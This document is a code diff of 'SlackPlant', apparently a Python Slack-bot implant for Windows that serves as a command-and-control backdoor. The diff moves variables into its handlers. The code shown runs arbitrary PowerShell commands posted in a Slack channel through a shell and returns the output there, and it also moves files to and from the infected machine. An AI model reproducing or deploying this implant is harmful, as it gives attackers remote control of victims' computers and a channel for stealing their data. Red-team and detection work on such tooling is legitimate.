@@ -12,14 +12,6 @@ from time import sleep
 
 class SlackPlant:
     
-    ps_path = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
-    help = \
-    '''!help        Get this message
-    !test        Test communication with implant
-    !command     Run a PowerShell command. Takes parameters and runs as subprocess
-    !download    Downloads a given link and uploads to Slack
-    !upload     Uploads a file to implant location'''
-    
     app = App(
             token=os.environ.get("SLACK_BOT_TOKEN"),
             signing_secret=os.environ.get("SLACK_SIGNING_SECRET")
@@ -109,6 +101,12 @@ class SlackPlant:
     
     @app.message("!help")
     def message_help(message, say):
+        help = \
+        '''!help        Get this message
+    !test        Test communication with implant
+    !command     Run a PowerShell command. Takes parameters and runs as subprocess
+    !download    Downloads a given link and uploads to Slack
+    !upload     Uploads a file to implant location'''
         say(f'{help}')
 
     @app.message("!test")
@@ -117,12 +115,14 @@ class SlackPlant:
 
     @app.message("!command")
     def message_command(message, say):
+        ps_path = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
         cmd = (' '.join(message['text'].split(' ')[1:]))
         res = subprocess.check_output(f'{ps_path} {cmd}', shell=True).decode('utf-8')
         say(f"```{res}```")
         
     @app.message("!download")
     def message_download(message, say):
+        ps_path = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
         channel_id = message["channel"]
         
         # TODO: Add ability to 'download' a file from local computer
@@ -135,6 +135,7 @@ class SlackPlant:
         
         res = requests.get(link, allow_redirects=True, stream=True)
         
+        app = SlackPlant.app
         app.client.files_upload(
             channels=channel_id,
             filename=filename,
